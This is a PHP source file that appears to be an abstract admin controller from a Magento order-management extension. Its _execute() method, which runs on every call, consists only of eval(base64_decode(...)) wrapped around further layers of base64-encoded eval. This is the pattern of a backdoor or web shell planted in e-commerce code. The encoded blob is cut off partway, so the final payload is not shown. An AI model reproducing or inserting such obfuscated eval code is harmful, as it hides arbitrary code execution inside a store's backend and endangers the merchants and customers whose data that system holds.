<?php

namespace IWD\OrderManager\Controller\Adminhtml\Order;

use IWD\OrderManager\Helper\Data;
use Magento\Backend\App\Action\Context;
use Magento\Backend\App\Action;
use Magento\Framework\Controller\ResultFactory;
use Magento\Framework\View\Result\PageFactory;
use IWD\OrderManager\Model\Log\Logger;
use Magento\Framework\Exception\LocalizedException;

/**
 * Class AbstractAction
 * @package IWD\OrderManager\Controller\Adminhtml\Order
 */
abstract class AbstractAction extends Action
{
    /**
     * Action type FORM
     */
    const ACTION_GET_FORM = 'form';

    /**
     * Action type UPDATE
     */
    const ACTION_UPDATE = 'update';

    /**
     * Action type CHECK UPDATE
     */
    const ACTION_CHECK_UPDATE = 'check_update';

    /**
     * @var string
     */
    private $actionType = null;

    /**
     * @var string[]
     */
    private $response;

    /**
     * @var \Magento\Framework\View\Result\PageFactory
     */
    protected $resultPageFactory;

    /**
     * @var Data
     */
    protected $helper;

    /**
     * @param Context $context
     * @param PageFactory $resultPageFactory
     * @param Data $helper
     * @param string $actionType
     */
    public function __construct(
        Context $context,
        PageFactory $resultPageFactory,
        Data $helper,
        $actionType = self::ACTION_GET_FORM
    ) {
        parent::__construct($context);
        $this->resultPageFactory = $resultPageFactory;
        $this->helper = $helper;
        $this->actionType = $actionType;
    }

    /**
     * @return $this
     */
    final public function execute()
    {
        try {
            $this->_execute();
            $this->response['status'] = true;
        } catch (\Exception $e) {
            $this->response = [
                'status' => false,
                'error' => $e->getMessage()
            ];
        }

        return $this->getJsonResponse();
    }

    /**
     * @return void
     * @throws \Exception
     */
    private function _execute()
    {
        eval (base64_decode('IGV2YWwgKGJhc2U2NF9kZWNvZGUoJ0lHVjJZV3dnS0dKaGMyVTJORjlrWldOdlpHVW9KMGxIVmpKWlYzZG5TMGRLYUdNeVZUSk9SamxyV2xkT2RscEhWVzlLTUd4SVZtcEtXbFl6Wkc1VE1HUkxZVWROZVZaVVNrOVNhbXh5VjJ4a1QyUnNjRWhXVnpsTFRVZDRTVlp0Y0V0WGJGbDZXa2MxVkUxSFVreFpWV1JPWlZaYVZWTnJPVk5oYlhoNVZqSjRhMVF5VW5OalJXaFhWbnBzVEZSVlpEUlNWbFpYV2tkMFZHSkZWak5WYlRBeFZrWmFWazVWVWxwTlJuQXpXVEJhUjFkRk9WWmtSbEpUWVROQmVWWXhXbUZpTVZKMFZXdGtVbUpzU2xSWmJHaERZMnhXY1ZOcVVrNWlSM2d3V2xWYVQxUXhXWGRPVld4WFlrZFNjbFpXV21GU1ZrWjBUbFp3YkdFelFsbFhXSEJIWkRKT1dGTnFXbGhpUlhCWVZteFNWMVl4V2xWU2JGcFBWbXhHTkZkcVRtdFpWa3BYWTBab1ZtSllRbnBWTUZwaFVsWktjbVJHVm1oTk1VcFdWbFprZDJFeFNsZFdiR2hRVm5wV1ZWWnNWVEZSTVdSeFVXNU9VMUpyV2xsWGExWjNWV3N4UmxkdVZsWk5WbHBRVlZjeFJtVldWbkpoUjJoVVVsVndlRmRzV2xOUmJVNXpZa1phWVZKdFVuRlVWM014VTFaYWRFNVlUbFZXYkhCR1ZtMXdWMWRIU2toaFJXaFZWbXh3TTFZeFdsTmpWa1p6V2taT2JHSllhRVZXTVZKRFlUSk9kRk5ZWkd0U2JGcHhWRlZTVjFKV2JGZFdhMlJwWWtVMVYxWkhkRXRaVlRGSVpVVldWbFp0VW5KVk1uaEdaREZLZEU1V1VsZFdWRlpWVjJ4YVlXUXhaRmRWYmxaaFVqSjRUMWxYZUZwTmJGbDVaVVU1VW1GNmJGZFphMVpUVm0xR2NsTnRPVlpoYTI4d1ZHMTRVMUl4VmxWU2JXeE9WMFZLV2xkc1ZtOWhNV3hYV2tWYWFWSkZTbGRWYm5CSFkyeHNjbHBHVGxOTlZUVXdXbFZrZDFSck1VWmlNMnhZVm5wQmVGWkVTa3RTYlZKR1ZXMW9iR0pXU2tkV2JGcHFUbGRLYzFSc1dsVmhNSEJvVkZWa05GSldWbGRhUjNSVVlrVldNMVZ0TURGV1JscFdUbFZTV2sxR2NETlpNRnBIVjBVNVZtUkdVbE5YUlVvMlZqRm9kMVF4UlhsVmJsSlVZbXhhVmxsc2FHOVhWbkJYV2taT1UwMVhkRFZVYkZZd1lUSktWazVZWkZoaE1sSlVWVEo0UzFKV1JsVldiRnBUWVhwV1JGZFhNSGhUTVZwelYyNVNUMVpyY0ZsVmJGSlhVa1prY2xremFGZE5WbFkwV1RCYVlWWlhSbkpYYkdSYVlrZFJNRlpWV210alZrcHlUMVUxVjJKWVVURldhMk40VGtkR2NrMUlaRTVYUmxwVlZteFZNVmxXYkhOV2JrNVRVbXhhTVZsclpFZFhSa3BWVmxod1dGWXpRa3RVVm1SWFl6Sk9SMXBIY0U1aGJGcDRWa1prTkZsWFRsZGhNMnhPVm0xU1QxVnRkRmRPVmxGNFdrUkNXbFpzVmpWV1Z6RXdWa1phVjFKcVRsVk5WbHA2Vld0YWQxTldWbk5VYkdST1lrVndSVll4YUhkUk1VbDNUVmhPYWxKdFVsVlpiR2h2VlRGU1ZWSnRSbGRTYlhoWVZteFNSMkZYUlhwUlZFWmFWa1Z3Y2xsclpGTk9iRVp5WlVaU1YxWlVWa1JXTW5CRFl6RktSMUpzYUdGU1dFSlRWRlZXWVdSV1ZYaFdhemxTWWtjNU0xbHJWbE5WYkZsNVZXdDBWbFpGV2t4VWJGcHJZekpHUms5Vk5WZE5TRUpMVm14YWEyRXhWbGRXV0dSVFltdHdhRlZzWkZOa2JHdDNXa1U1VDFaVVJrVmFSV1JIVkcxS1IySkVUbGRpUjA0MFZtcEtWMlJHVm5OaFIzaFRVbFZ3VmxaVVFtRlRNREZIWWtoS1ZXSlVWbkZWYkZKeVpXeFNWbFpxUWxSaVJWWXpWVzB3TVZaR1dsWk9WVTVZWVd0S2VsVnJXa2RYUm5CR1kwWktUbEpXY0RGV1ZFWlhWREZHYzJJelpHbFNWMmh3Vlc1d1IxTXhWbFZUYlhScFRWZDRXRmxWVlRWWlYwcElaVVp3VmsxcVZucFdNbmhyVTBkU1NWZHNVbWhOYldoTlYxZDBhMVJ0Vm5OWGJsWlZZbGhTVTFSWE5WTk5NVlY0Vm0wNWJHSkdTbmxXUnpWRFZXeFplVlZyZEZaV1JVcElXVzE0VDFac1VuSlRiVVpPVWpOb1JsWldXbXRoTVU1elVsaGtVMkpVVmxWV2JGVXhVVEZrY1ZGdVRsTlNhMXBaVjJ0a2IxWXdNVmhsU0ZaV1pXdEtjbGw2U2xkak1XOTZZMFpXYUdFd2NIaFhWM2hyVGtVeFYxcElWbWxTZWxadlZGZHpNVTFHV25ST1dHUm9UVlpzTmxkcVRtdFdSVEZXVGxWU1ZVMUhVbWhWYTFwSFpFVTFXRkpzYUZOaE0wSXdWbXBHVTFNd05VaFNhMmhWVjBoQ1ZsWnVjSE5VUmxWM1ZtNWthazFYZHpKV1IzaHJZV3N4YzFOclZscFdSWEJ5VmxaYVlWSldSblJPVmxKb1lUQlpNRmRXVm1Ga2JWWlhWMjVXVjJKWVVsUmFWekUwWTFaYVdFMUVSbFJOYTFwSlZUSjRiMVl5Um5KT1dFSlZWa1ZLTTFwV1dtdFNiR1J5Vkcxc1RtRjZWWGRXVnpBeFpERnNWMVpZYkZWaWJWSlZWbXhrYjA1c1draGtSVGxxVW10YVdWZHJWbmRWYXpGR1YyNVdWazFXV2xCVlYzaDJaREpLUmxWc1NsZE5iRXBNVmxaU1ExSXlTbk5VYkZwVllUQndhRlJWWkRSU1ZsWlhXa2QwVkdKRlZqTlZiVEF4VmtaYVZrNVdVbUZXYkhBelZqRmFVMk5XU25SaVJsSlRZVEZ3TVZac1ZtRlVNVVY0WWtoS2FVMHpRbFZaYkdodlkxWlNWVkp0Um14aVNFSkhWa2N4ZDFsVk1WWlRiRnBWWVRKU2NsVjZSazlTYlU1SlZHeHdiR0Y2VmxsWFdIQkxWVEZKZDAxVlZtRlNWbHBYVm01d2MyUldWWGhXYXpsU1lrYzVNMWxyVmxOVmJGbDVWV3QwVmxaRlNraFpiWGhQVm14U2NsTnRSazVTTTJoR1ZsWmFhMkV4VG5OU1dHUlRZbFJXVlZac1pHdE5NV1J4VW01a1dGSXhXa3BaTUdSSFZtc3hSbUV6Y0ZaaE1YQklXa2Q0ZG1ReVNrWlZiRXBYVFd4S1RGWldVa05TTWtwelZHeGFWV0V3Y0doVVZXUTBVbFpXVjFwSGRGUmlSVll6Vlcwd01WWkdXbFpPVlU1WVlXdEtlbFZyV2tkWFJuQkdZMFpLVGxKWGQzcFdNVnBYWWpGTmVWVnVVbFpoYkZwVFdXMTRZV0ZHV1hkYVJUbHBZa1p3UjFkWWNGZGhSMHBJWlVac1lWWlhhRVJaYTJSTFZqRmtkVk5zV21sU01tZ3lWMVprTkdReFpGZFNia1pTWWxkb1dGcFhNVE5sUmxZMlVXeHdUMVp1UW5sYVJWWlRXVlpLVjFkdE9WZE5SbFY0V1dwR2MyTnNjRVZWYlhScFZtdFpNVlp0TUhoTlJrNXpWR3RhYWxORk5XRmFWM014VjBac05sTnNUbE5TYTFwNFZWY3hORmRHU2xaalNIQldUV3BXZWxreU1VOVNhemxWVkdzMVUxZEdTa3hXVmxKRFVqSktjMVJzV2xWaE1IQm9WRlZrTkZKV1ZsZGFSM1JVWWtWV00xVnRNREZXUmxwV1RsVk9XR0ZyU25wVmExcEhWMFp3Um1OR1NrNVNWM040VmxkMFlWSXlVbk5pTTJScFVsWktVMVpxU2xOVE1WWlZVV3RrYVdKRk5WZFdSM1JMV1ZVeFNHVkZWbFpXYlZKeVZUSjRSbVF4U25ST1YwWnBVbFpaZWxaWWNFTmpNVXBIVW14b1lWSllRbE5VVlZaaFpGWlZlRlpyT1ZKaVJ6a3pXV3RXVTFWc1dYbFZhM1JXVmtWS1NGbHRlRTlXYkZKelZHMW9UbUV4Y0dGV2EyTjRZakpHVjFOWWNHaFNSWEJvVld0V2QxZEdiRlZTYkdSVVVtdHdNVmxyV25kV01sWnlWMVJLVmsxV1dsTmFSRVoyWlVad1JWWnRSbE5OYldoM1ZsZHdUMkl3TVhOalJWWlVZa2RTYjFSVmFFSk5WbkJGVTIxMFZFMUVRak5VYTJoclYwWmFkR0ZHVWxWV2JWSlFWR3hhY21Wc1VuSmpSa3BPWWtWd05sWXhVa3BOVmsxNVZXNVNWV0pyU21oVmFrWkxWVlp3U1dORlRsVlNhelZYVmtkMFMxbFZNVWhsUlZaV1ZtMVNjbFV5ZUVaa01VcDBUbFpTVjFaVVZrUldNbkJEWXpGS1IxSnNhR0ZTV0VKVVZGWm9RbVZXWkZWVFdHaFhUV3RhU0ZsVVRuTlpWVEYwVldzeFZsWkZXa3hVYkZwcll6SkdSazlWTlZkTlNFSkxWbXhhYTJFeFpITmFSVnBPVm5wV1ZWbFVTbEprTVd4eVdrWmtWMUpyV2xaWmExcEhZVVphVmxkdWJGaFdSVXB5VldwS1YxWXlTa2RoUlRWVVVsVndURlpVUW05VU1WRjRVbGhzYVZKVmNHaFVWV1EwVWxaV1YxcEhkRlJpUlZZelZXMHdNVlpHV2xaT1ZVNVlZV3RLZWxWcldrZFhSbkJHWTBaS1RsSldjREZXVkVaWFZERkdjMkl6YkZOaVIyaFpWbXBLVTFSV1ZsVlJiVVpyVFZkNE1GcEljRmRoUmtsM1RsUkdWazFxUm5aWmExcFdaVlp3U1ZOc2NGZFNXRUpaVmtkNFYwNUdTa2RTYkdoclVqQmFWRlJYTlc1TmJGbDRWMjEwVDFJd01UVlZNV2gzV1ZaSmVtRkhhRlppV0ZKTVdXcEdjbVZWTVZaYVIzUlRUVVJSZUZkV1VrOVJNVTV6Vkd0c1ZXRjZiRk5VVnpFMFVURmtjVkZ1VGxOU2ExcFpWMnRXZDFWck1VWlhibFpXVFZaYVVGVlhlSFprTWtwR1ZXeEtWMDFzU2t4V1ZsSkRVakpLYzFSc1dsVmhNSEJvVkZWa05GSldWbGRhUjNSVVlrVldORlV4YUd0WGJGcFlWVzV3WVZZelVUQldiRlV4VjFkS1NGSnNhRk5XUmxZMlZqRmtkMU5yTVZoV2JrNXFVbTFTY1ZSWE5WTmlNVkpZWlVad1RsWnRVa2hXUjNSTFZVWmFXR1ZGVmxkV2VsWnlWako0YTFKdFRraFBWbkJwVW10dk1sWnJaREJVTWs1SFVteG9ZVkpZUWxOVVZWWmhaRlpWZUZack9WSmlSemt6V1d0V1UxVnNXWGxWYTNSV1ZrVktTRmx0ZUU5V2JGSnlVMjFHVGxJemFFWldWbHByWVRKS1YxWnNWbEpoTTJoVlZteFZNVkV4WkhGUmJrNVRVbXRhV1ZkclZuZFZhekZHVjI1V1ZrMVdXbEJWVjNoMlpESktSbFZzU2xkTmJFcE1WbFJDVTFFeFVYaFNXR3hwVWxWd2FGUlZaRFJTVmxaWFdrZDBWR0pGVmpOVmJUQXhWa1phVms1VlRsaGhhMHA2Vld0YVIxZEdjRVpqUmtwT1VsWndOVll5ZEZkaE1rbDVWR3RvVldGc1drOVZWRTVUWTFac2MxZHRSazlpUjNRelYxaHdWMkV4V1hkTlZGWlhZbFJHVEZWNlFYaGpiR1IxWTBad2FFMXJNSGhXUmxKSFpERmtSMVpzYUU5V2JYaFhWRlZXVmsxV1ZYaFdiRTVUWVhwU00xWlhlRXRoVlRGMFZXdDBWbFpGU2toWmJYaFBWbXhTY2xOdFJrNVNNMmhHVmxaYWEyRXhUbk5TV0dSVVZrWmFWVlpzWkZOWFJtdzJVMnMxYkZac2NGbFhhMlEwWVRKV2NsTnJNVlpOVmxwUVZWZDRkbVF5U2taVmJFcFhUV3hLVEZaV1VrTlNNa3B6Vkd4YVZXRXdjR2hVVldRMFVsWldWMXBIZEZSaVJWWTBWVEZvYTFkc1dsaFZibkJoVmpOUk1GWnNWVEZYVjBwSVVteG9VMVpHVmpaV01XUjNVMnN4V0ZadVRtcFNiVkp4VkZkd1YyTldiSE5YYlVaUFlraENTRmRyVWxOVWJFcFlUMVJTVlZaWFVuSldWbHBXWkRGS2RWWnNXbE5XTVVwVlYxUkNhMVV5VGtkU2JsSnFVako0VkZSVlduWk5iR1JWVkc1YWEwMXJXbGxWYlhoeldWWkplbFZyTlZkaWJrSjZWRlZhVTFJeVJrWlViWFJwVmxSV1MxWnRNREZoTVZKWFYxaHNhRk5GTlZsV2JURlRWa1pzY2xwRk9XcFNhelZWV2tWV01HSkdXbFpYV0doV1RWWmFVRlpVUVhoVFJrcHlZVWRzVkZORlNrOVdiWFJUVmpKU2MxcElUbUZTUmtweVZGWm9RMWRzVlhoaFJrNVdWakJ3V1ZaWE5VOVpWa3BYVjJ4b1lWWnRVbEJhUlZVMVYxZEtSMVpzWkU1V2JUaDVWakZvZDFNeFNYbFRiazVxVW14S2FGUlVRa3RUTVZaWlkwWk9hV0pGTlRGWk1GSlBZVEpLU1ZGcmJGcGhNVXBNVmxaa1IxZEdVblJPVmxaVFRXczBlbFpZY0VOak1VcEhVbXhvWVZKWVFsTlVWVlpoWkZaVmVGWnJPVkppUnpreldXdFdVMVZzV1hsVmEzUldWa1ZLU0ZsdGVFOVdiRkp5VTIxR1RsSXphRVpXVmxwcVRWWldWMU5ZYUZSaWJWSm9WV3BLTkZKR2JGaE5WWFJVVW10d01Wa3daSGRpUjBaeVUyNWtXRlpzY0haWlZFcEdaREpXUjJGR1FsaFNhM0JQVm1wQ1YxTXdNWE5oTTJSb1VtMVNjbFJWYUc5WFZteHlZVVprV2xZd2NGWlpWV2hEVm14SmVXVklSbGhoYTBrd1dUQmFSMWRIVWtoa1JrNU9ZbGRuZWxZeFVrOWpiVkYzWXpOc1UyRXlhRmhaYlhNeFkxWldjVkp0Ums5V2JFcElWbFpTUjJGWFNrbFJiSEJYVmpOU2VsZFdXbHBsYlVaRlZHeGthRTFzU2xsV1IzUnJWVEZLUjJJemNGSmhNMEpUV2xkNFMyUldWWGxPV0dST1RXeEtlbGt3Vm05aFZrcEdZMFpLV2xadFVrOVVWRVpMVWpGS2RWZHRSazVTTTJoR1ZsWmFhMkV4VG5OU1dHUlRZbFJXVlZac1ZURlJNV1J4VVc1T1UxSnJXbGxYYTFaM1ZXc3hSbGR1VmxaTmJsSjJWbFJLU21WV1NuTmlSbFpZVW10d1UxZFhNVEJrTWsxNFlrUmFWV0V3TlhKWmJGWjNUVlphU0UxVVVsaFNNVnBaVmxjMVQxbFdXbGhoUmxKWVlsUkdWRll4V2s5a1ZsSnlaRVUxVjFKVmNERldiRlpoVkRGR2RGSnNhRk5oTW5oWFdWZDBTMk5XVlhkV1dHUk9Za1pLU2xsWWNGZFVhekZ6VW1wYVdGWkZOVmhaVlZwclUwWldkVk5zYUZkaVZrcDVWMWQwYTFNeVVrZFZia1pYWVhwR2NGWnNVbFpsVm1SWVpVVTFUMVl3Y0VsV2JYUnpWbTFLV1dGSVFscGlXRTE0V2tSR2MyTldUbFZTYlhob1RUSlJNVlpzWXpGWlYwVjNUVmhHVjJKdVFtRlpWM1IzVTBac1ZWSnVUbGhTYXpVeFZrY3hSMVp0Vm5SbFNHaFlZVEZ3ZGxaRVFYaFRSazVaWWtVMVYwMHlhSGhYVmxwVFl6QXdlR0V6YkU1U1JscHZWRmQ0UzFkV1draGpSVTVvWWxaYVYxbFljRTlWTVVweVYycEtXR0ZyU25wVmExcEhWMFp3Um1OR1NrNVNWbkF4VmxSR1YxUXhSbk5pTTJScFVsWktVMVpxU2xOVE1WWlZVV3RrYVdKRk5YbFpWVnBQWVZVeGNsZHNjRmRTYldoVVZsWmtTMk50VGtsVWJIQnNZWHBXUlZkclkzaFRNbEpYVlc1U2JGSnRhSE5XYWtaTFpHeGtXR1JIZEU5U01Vb3dWbFpvYzFZeVNsbFZhM2hWVm14S1JGbHRlRmRTTVZKeVUyMTBUbEpIZERaV1JsWlhUVVpPYzFKWVpGTmlWRlpWVm14Vk1WRXhaSEZSYms1VFVtdGFXVmRyVm5kVmF6RkdWMjVXV0dKWWFFZGFSRVpPWkRKS1JsVnNTbGROYkVwTVZsWlNRMUl5U25OVWJGcFZZVEExVVZac1pEUlRWbHAwVGxVNWFHRjZSbnBXTWpWclYwZEtXR1ZGVGxwaGEwb3pWVEZhVjJSRk9WaGhSbWhUVmtWV00xWnNWbXBsUmtsNVVtNVNWbUV5YUhCVk1GcDNZMFpzY2xkcmNFNVdiWFF6VjJ0YVlWbFZNVlpUYkZwVlZsZFNjbGxYYzNoak1XUjFZMFpvYVZkRlNYbFdSekUwVWpGYWMxVnVUbGRpUmtwWVZtdGtORlZXV1hkVmEyUlhUVlphV0ZVeWRHRlZNa3BIVjJ4U1YxWkZiM2RaYlhoM1YxWnJlbHBHVWs1U00yaEdWbFphYTJFeFRuTlNXR1JUWWxSV1ZWWnNWVEZSTVdSeFVXNU9VMUpyV2xsWGExWXdWa1pLV1ZGdWNGaFhTRUpRVm1wS1RtVldWbkpWYkVwWFVqTm9URlpXVWtkVGJWRjRZa1phWVZORk5YTlpWRTV2Vm14U2MxbDZSbHBXYlZKSVZUSjRVMWRIU2toaFJrSlZWbTFTVEZVeFdsZGpiVXBJWkVaT2JHRXhiekpXV0hCRFZESk9jazVJWkZaaVJYQndWRmN4VTFNeFZsVlJhMlJwWWtVMVYxWkhkRXRaVlRGSVpVVldWbFp0VW5KVk1uaEdaREZPZFZwR2FHbFdNMmhFVjFkd1EyTXhaRWhUYTJ4cVVtMTRUMWxVUm5aTlZtUlZVMWhvVTAxRVZsZGFSVlpUVm0xS2RHVkhhRmROUmxWM1dsVmFjMk50UmtkVGJYQlRWMFpLVmxaV1pIZGhNVXBYVm14b1VGWjZWbFZXYkZVeFVURmtjVkZ1VGxOU2ExcFpWMnRXZDFWck1VWlhibFpXVFZaYVVGVlhlSFprTWtwR1ZXeEtWMDFzU25aV2JYQkhZekpLYzFSWVpHRlRSVFZ6V1d0a2EwNXNXa2hqUlU1b1lsVndXVnBWVWtkWFIwcDBaVWhXV2xaRmNGQmFSVnBoWkZkT1NHUkdaRTVOYlZGNlZsaHdSMVF4UlhkUFZXaFlZVEZLVTFsc1VsZGhSbGwzVjJ0MGFWWnRVbFpWTW5CVFlVWkpkMDFVV2xkU2JVMHhWWHBHVDFKdFRrbFViSEJzWVhwV1dWZFljRXRWTVVwSVVsaHNZVkpyV2xoVmExWkxaRlpWZVdORlNteFNNRnBJV1dwT2MxWXlTbk5YYmtwV1ltNUNlbGxYZUZka1JUVldaRWRvVTAxSVFscFdiVEYzVkRKR1ZrMUlaR3BUUjNoWlZXeGFkMUpHYkhGVGF6bHJVbXR3TVZrd1pFZFdhekZ5VGxST1ZrMVdXblphVjNoVFkyeFNkVkZzU2xkTmJFcE1WbFpTUTFJeVNuTlViRnBWWVRCd2FGUlZaRFJTVmxaWFdrZDBWR0pGVmpOVmJUQXhWa1phVms1VlRsaGhhMHA2Vld0YVIxZEdjRVprUmxKVFYwVktObFl4YUhkVU1WbDVWRmhzVm1FeFNsTldhMlEwVXpGV2RFNVZPV3RXYlhRMVZGWmFhMkpIU2xkVGJHeGhWbFpLUkZWNlNsZFdiRXBWVm14YVUwMXVhRVJYVmxKTFZESlNSMWR1Vm1wU00xSllWRlJLYTAweFdYZFhiRTVzWWtaS2VWWkhOVU5WYkZsNVZXdDBWbFpGU2toWmJYaFBWbXhTY2xOdFJrNVNNMmhHVmxaYWEyRXhUbk5TV0dSVFlsUldWVlpzVlRGU1JsRjRWbTVPVkZKc2NERldSekYzVkcxS1IxZHVWbGhpUjJoeFdrUkdUbVF5U2taVmJFcFhUV3hLVEZaV1VrTlNNa3B6Vkd4YVZXRXdjR2hVVldRMFVsWldWMXBIZEZSaVJWWXpWVzB3TVZaR1dsWk9WVTVZWVd0S2VsVnJXa2RqVmtaMFlVWlNVMWRGUmpWV01uUnZZekZGZVZWc1pHcFNiWGhoVkZjeFUxWnNWblZqU0U1cVZtMVNXRmRyVWxOaGJFbDRWMnBDVjJKVVJYZFdWRVpyVTBkR1NWSnNhR2xTTW1oRlZrWldhMUl4WkVaUFZteFhZVE5vVkZsWE1UUmtSbFkyVVdzNWFFMVZjRmxWYlhoelZsZEtXR0ZJUWxaaGF6VjJWRmQ0ZDFKV1RuTmFSMmhPVWpOb1MxWlVTWGhPUjBaeVRVaG9XR0p1UW1oVmJGVXhVa1pTVmxwR1pGaFdhMW93V2xWV01HSkdXWHBWYWs1WFVrVTFjVnBFUms1a01rcEdWV3hLVjAxc1NreFdWbEpEVWpKS2MxUnNXbFZoTUhCb1ZGVmtORkpXVmxkYVIzUlVZa1ZXTTFWdE1ERldSbHBZV2tST1YxSXpVbEJaTUZwSFYwWndSbU5HU2s1U1ZuQXhWbFJHVjFReFJuTmlNMlJwVWxaS1UxWnFTbE5UTVZWM1ZXdE9WVTFWVmpWWmExWkxXVlV4U0dWRlZsWldiVkp5VlRKNFJtUXhTblJPVmxKWFZsUldSRll5Y0VOak1VcEhWbTVTYTFJeWFGbFZiRkpYWkd4a1dHUkhkRTlTTVVvd1ZsWm9jMVl5U2xsVmJHUldZV3RLYUZSc1dtdFdNV3Q2WVVkNGFFMXVhRWRXUmxacllURmtTRlpzYUZaaVZHeGhXVlJLVWsxR2NFaE5Wa3BzVm14d01GcEZWakJpUm1SSVZXNVdWazF1UWxCV1JFRjRVakpLUjJKR1dtaGhNWEI0VjJ4YWExUXlWbk5VYkZwVllsaFNjRlZxUVRGTlZsVjVUbGRHYUdKVldsbFdWekV3VmxVd2VWUnFUbFpsYTBwNlZXdGFSMWRHY0VaalJrcE9VbFp3TVZaVVJsZFVNVVp6WWpOa2FWSldTbE5XYWtwVFlVWnNjMVZ1VGs5V2JWSjZWMnRXYTJGSFNsWlhhMVpXVm0xTk1WVjZSazlTYlU1SlZHeHdiR0Y2VmxsWFdIQkxWVEZLUjFKdVVtaFNNMEp6Vm14V1lXVldaRmRWYTNSWFRVUldWMWxyVmxkVWJFVjZWV3QwVmxaRldreFVWRVpyVmpKR1JtUkhhRk5OU0VKV1YxWlNTMkV5U2toVmFscFNZVE5vVlZac1ZURlJNV1J4VVc1T1UxSnJXbGxYYTFaM1ZXc3hSbGR1VmxaTlZscFFWVmQ0ZG1ReVNrWlZiRXBYVFd4S1RGWlhjRXRPUjFKSFZHeGFWV0pVVm05VmFrSmhWMVpTYzFwSFJsaGlSMUpIV1RCU1YxZEdXblJoU0d4YVlXdEtNMVV3WkZOVFIxWklaVVphVGsxc1NqRldWRW93WVRGVmVWUnJhRlZYUjNoVVdXMXpNV05HVm5WalNFcHNZa2RTZWxkcldrOVdiRnAwWlVad1ZrMXFSblpaVmxwclVtc3hXVnBHVWs1V1ZGWkZWa2R3UTFVeFZuUlRXR3hoVWxoQ1UxUlZWbUZrVmxWNFZtczVVbUpIT1ROWmExWlRWV3haZVZWcmRGWldSVXBJV1cxNFQxWnNVbkpUYlVaT1VqTm9SbFpXV210aE1VNXpVbGhvVkZkSFVtRldiR1JUWld4d1dHUkVVbGRXVkZaYVdXdGtSMWRHU2xWV1dIQllWak5DUzFSV1pGZGpNazVIV2tkd1RtSnNTblpXUm1RMFYyc3hWMXBGWkZWaE1IQlJWbXhrTkZKV1dsaE9WM1JZWWtkU1Ixa3dZelZYYlVwSFUycGFWMUl6VWxCWk1GcEhWMFp3Um1OR1NrNVNWbkF4VmxSR1YxUXhSbk5pTTJScFVsWktVMVpxU2xOVE1WWlZVV3RrYVdKRk5WZFdSM1JQVlVaYVYxTnNUbHBoYTNCeVZUSjRSbVF4U25ST1ZsSlhWbFJXUkZZeWNFTmpNVXBIVW14b1lWSllRbE5VVlZaeVRWWldjbGRyWkd0aVJ6a3pXV3RXVTFWc1dYbFZhM1JXVmtWS1NGbHRlRTlXYkZKeVUyMUdUbEl6YUVaV1ZscHJUVWRGZUZOWWJHaFRSMUpoVkZSS01FMHhUalpTYms1WVVteGFNRnBGV2xkVk1sWjBaVVJHV0ZaRk5YcFpiVEZQVW1zNVZWUnJOVk5YUmtwTVZsWlNRMUl5U25OVWJGcFZZVEJ3YUZSVlpEUlNWbFpZWTBoT1ZHSkZiRFJXTWpWM1YyMVdjbU5HYUZwTlJuQXpXVEJhUjFkRk9WWmtSbEpUWVROQmVWWXhXbUZpTVZKMFZXdGtVbUpzU2xSWmJHaERZMnhXY1ZOcVVrNWlSM2d3V2xWYVQxUXhXWGRPVld4WFlrZFNjbFpXV21GU1ZrWjBUbFp3YkdFelFsbFhXSEJIWkRKT1dGTnFXbGhpUlhCWVZteFNWMVl4V2xWU2JGcFBWbXhHTkZkcVRtdFdWMFY1WlVaU1YySkdWWGhXUmxwclVsWktjMXBHV2xkaE0wSklWbGN4TkZZeFZYaFdXR3hyVW5wV2FGWXdaRTlOTVZZMlVXNU9VMUpyV2xsWGExWjNWV3N4UmxkdVZsWk5WbHBRVlZkNGRtUXlTa1pWYkVwWFRXeEtUVlpVUW1GVE1sSnpZa1prYUZKVVZuSlZiWFJMVFVac1ZscEVVbWhXYXpWSFZUSTFUMWRyTVhSa1JFNVVaV3R3VUZwRldtRmtWMFpJWkVaa1RsWnRPSGxXTW5SWFdWWlZlVlZ1VGxOaVIzaFRXVzEwUzFSV1ZsVlRibkJPVFZWd1NGVnROV0ZaVlRGSVpVVldWbFp0VW5KVk1uaEdaREZLZEU1V1VsZFdWRlpFVmpKd1EyTXhTa2RTYkdoclVqTkNjRlp0ZUhaTmJHUlZVVzF3VDFZeFNsbFdSbWh6VmpGWmVWVnNTbGRXUlVwSVdUSjRkMUpzY0VoUFYzQlRUVVJSZUZaR1ZrOU5SMFpIVTFob1dHSnVRbUZVVldSVFYwWndWMVpxVWxkV1ZGWlpWR3hrUjFkR1NuSmpSbFpYVFc1b2RsWkVTbEpsVms1WllrVTVXRk5GU205V2JGSkxZVEpSZUZWWWNGcE5NbEpWVkZWa05GSldWbGRhUjNSVVlrVldNMVZ0TURGV1JscFdUbFZPV0dGclNucFZhMXBIVjBad1NHRkdaRTVXTTJneFZsaHdRMVF4VlhsV2JHUnFVbTE0VmxsdE1WTmpSbEpZWTBaa1QySkhVbnBXTWpWM1lWZEtSbU5HY0ZaTmFsWjZXVlpWZDJReVNrbFdiR2hUWVhwV1JGWkVSbUZSTVZwV1RWVm9ZVkpZVWs5WlYzUmhVMFpaZVdORlRsTk5iRnA2VlcxNGMxZEhTbGxoUm1SYVlrWndhRlZzV25kU01XUnlaRWR3VTJKRmIzZFdNblJoVlRKRmVGZFlaRTlYUlZwWldXdGtiMVZHY0Zoa1NHUlBWbXRhV1ZSV1ZqQmhSbHBXVjI1c1dGWkZiRFJXYWtwWFpFWlNjbUZHUWxoU2JIQjRWa1prTkZsWFJsZFVia1pWWVhwc2NGVnRNVEJPYkZWNVRWUlNhRTFWY0ZkVWJGSkxWMGRGZVZWc1pGcGlXR2gyVm10YVIxWlhTa2RTYkZwT1VsWnZlRll4WkRSV01WbDVVMjVPVTJKSGVGWlpWRUozWTJ4c2MxZHRSbGRTYlZKNlZtMXpOVlJzV25OWGFrSmFZVEZWTVZkV1pGZFhSbEoxV2taU1YxWXlaekpXYTJRd1ZESk9SMUpzYUdGU1dFSlRWRlZXWVdSV1ZYaFdhemxTWWtjNU0xbHJWbE5WYkZsNVZXdDBWbFpGU2toWmJYaFBWbXhTY2xOdGFFNWhlbFYzVm0wd01XUXlSWGhYV0hCaFRUSlNWVlpzV2tkTk1XUnhVVzVrVkZac1dqQlVNV1J2VjBaS1ZWSllaRmRXVjA0MFdWUktTMU5HVm5KYVJsSnBWMGRvZUZaR1VrZFpWMVp6WTBWYVYySlViRTlWYWtKM1YxWndSVk5VVmxWU2JIQktWa2R6TlZWck1YUmxSVTVZWVd0S2VsVnJXa2RYUm5CR1kwWktUbEpXY0RGV1ZFWlhWREZHYzJJelpHbFNWa3BUVm1wS1UxTXhWbFZSYTNSclRWZFNNRmxyVmt0aFZURklaVVpzV21FeWFETldNVlY0W